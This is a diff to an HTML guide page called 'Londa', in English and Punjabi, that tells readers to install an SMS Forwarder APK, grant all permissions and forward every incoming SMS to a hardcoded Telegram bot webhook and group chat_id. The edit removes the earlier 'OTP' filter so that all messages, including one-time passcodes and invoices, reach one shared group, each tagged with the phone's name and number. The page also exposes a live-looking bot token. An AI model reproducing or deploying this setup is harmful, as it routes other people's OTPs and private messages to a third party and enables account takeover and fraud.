@@ -4,20 +4,20 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Londa — SMS Forwarder Setup & APK Download | OTP Telegram Guide</title>
-<meta name="description" content="Londa — Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram with name and number.">
+<meta name="description" content="Londa — Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward all SMS to Telegram with name and number.">
 <meta name="keywords" content="Londa, SMS Forwarder, OTP forwarding, Telegram webhook, APK download, F-Droid, SMS to Telegram, OTP bot">
 <meta name="author" content="Londa">
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://YOUR_USERNAME.github.io/YOUR_REPO/">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Londa — SMS Forwarder Setup & APK Download">
-<meta property="og:description" content="Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram.">
+<meta property="og:description" content="Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward all SMS to Telegram.">
 <meta property="og:url" content="https://YOUR_USERNAME.github.io/YOUR_REPO/">
 <meta property="og:image" content="https://YOUR_USERNAME.github.io/YOUR_REPO/1.png">
 <meta property="og:site_name" content="Londa">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Londa — SMS Forwarder Setup & APK Download">
-<meta name="twitter:description" content="Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step OTP forwarding guide.">
+<meta name="twitter:description" content="Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step SMS forwarding guide.">
 <meta name="twitter:image" content="https://YOUR_USERNAME.github.io/YOUR_REPO/1.png">
 <link rel="icon" type="image/png" href="1.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -29,7 +29,7 @@
   "@type": "WebSite",
   "name": "Londa",
   "url": "https://YOUR_USERNAME.github.io/YOUR_REPO/",
-  "description": "Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward OTP SMS to Telegram.",
+  "description": "Download APK & setup SMS Forwarder with Telegram webhook. Step-by-step guide to forward all SMS to Telegram.",
   "inLanguage": "en",
   "publisher": {
     "@type": "Organization",
@@ -43,13 +43,12 @@
   "@context": "https://schema.org",
   "@type": "HowTo",
   "name": "How to Setup SMS Forwarder to Telegram",
-  "description": "Step-by-step guide to configure SMS Forwarder app and forward OTP SMS to Telegram using webhook.",
+  "description": "Step-by-step guide to configure SMS Forwarder app and forward all SMS to Telegram using webhook.",
   "step": [
     {"@type":"HowToStep","name":"Install App","text":"Download and install the APK or F-Droid version of SMS Forwarder."},
     {"@type":"HowToStep","name":"Grant Permissions","text":"Open the app and grant all permissions including SMS, storage, and notification."},
     {"@type":"HowToStep","name":"Create New Rule","text":"Click the + icon to create a new forwarding rule."},
     {"@type":"HowToStep","name":"Set Sender","text":"Enter * in the sender field to match all senders."},
-    {"@type":"HowToStep","name":"Set Text Filter","text":"Enter OTP in the text filter field."},
     {"@type":"HowToStep","name":"Add Webhook URL","text":"Paste the Telegram bot webhook URL with group chat_id."},
     {"@type":"HowToStep","name":"Configure JSON","text":"Open advanced parameters and paste the JSON payload template with chat_id and placeholders."},
     {"@type":"HowToStep","name":"Test and Save","text":"Click Test then Save to activate the rule."}
@@ -457,7 +456,7 @@
 <header>
   <div class="logo-mark">⚡</div>
   <h1>Londa</h1>
-  <p class="tagline">APK Download &amp; SMS Forwarder Setup — Telegram OTP Forwarding Guide</p>
+  <p class="tagline">APK Download &amp; SMS Forwarder Setup — Telegram SMS Forwarding Guide</p>
   <div class="pills">
     <span class="pill">⚡ 2 Methods</span>
     <span class="pill green">✓ Step-by-Step</span>
@@ -541,25 +540,19 @@
       <button class="copybtn" onclick="copyCode('sender')">📋 Copy Sender</button>
     </div>
 
-    <!-- Step 4 -->
-    <div class="step">
-      <div class="step-title"><span class="step-num">4</span> Text Filter</div>
-      <p>Text filter field vich eh likho:</p>
-      <div class="codebox" id="filter">OTP</div>
-      <button class="copybtn" onclick="copyCode('filter')">📋 Copy Filter</button>
-    </div>
+    <!-- Step 4 (Text Filter) HATA DITTA GAYA HAI -->
 
-    <!-- Step 5 -->
+    <!-- Step 4 (hun Step 5) — Webhook URL -->
     <div class="step">
-      <div class="step-title"><span class="step-num">5</span> Webhook URL</div>
+      <div class="step-title"><span class="step-num">4</span> Webhook URL</div>
       <p>Webhook URL field vich eh link pao (group chat_id naal):</p>
       <div class="codebox" id="webhook">https://api.telegram.org/bot8962351328:AAGf-zO6MCrjyKOcKpvXmo9hrjUYjYFEOhQ/sendMessage?chat_id=-1004355666217</div>
       <button class="copybtn" onclick="copyCode('webhook')">📋 Copy Webhook URL</button>
     </div>
 
-    <!-- Step 6 -->
+    <!-- Step 5 (hun Step 6) — JSON -->
     <div class="step">
-      <div class="step-title"><span class="step-num">6</span> JSON Payload Template</div>
+      <div class="step-title"><span class="step-num">5</span> JSON Payload Template</div>
       <p>Advanced parameter kholo → JSON payload template vich eh paste karo:</p>
       <div class="codebox" id="json">{
   "chat_id": "-1004355666217",
@@ -582,16 +575,16 @@
         <code>"📲 Maninder"</code><br>
         <code>"📞 +919876543210"</code>
         <br><br>
-        👉 <b>Jis phone vich OTP aayega, us phone te oh phone da naam te number likho.</b>
-        Telegram te message vich ehhi dikhega — taaki pata lage kis number/phone te OTP aaya.
+        👉 <b>Jis phone vich SMS aayega, us phone te oh phone da naam te number likho.</b>
+        Telegram te message vich ehhi dikhega — taaki pata lage kis number/phone te SMS aaya.
         <br><br>
-        <b>📌 Note:</b> Sab OTP ik hi group (General) vich aayenge. Har phone de JSON vich alag naam/number pao, taaki pata lage kaunse phone da OTP aa.
+        <b>📌 Note:</b> Text Filter khaali chad de (kuch vi na likh) taaki <b>saare SMS</b> (OTP + invoice + hor) forward hon. Sab SMS ik hi group (General) vich aayenge. Har phone de JSON vich alag naam/number pao, taaki pata lage kaunse phone da SMS aa.
       </div>
     </div>
 
-    <!-- Step 7 -->
+    <!-- Step 6 (hun Step 7) — Test & Save -->
     <div class="step">
-      <div class="step-title"><span class="step-num">7</span> Test &amp; Save</div>
+      <div class="step-title"><span class="step-num">6</span> Test &amp; Save</div>
       <p>Niche <b>Test</b> button te click karo → phir <b>Save</b> button te click karo. Done ✅</p>
     </div>
   </div>
@@ -600,7 +593,7 @@
 
 <footer>
   <p>© 2026 <span class="brand">Londa</span> — SMS Forwarder Setup Guide</p>
-  <p>Made with 💙 for easy OTP forwarding</p>
+  <p>Made with 💙 for easy SMS forwarding</p>
 </footer>
 
 <div class="toast" id="toast">✅ Copied!</div>
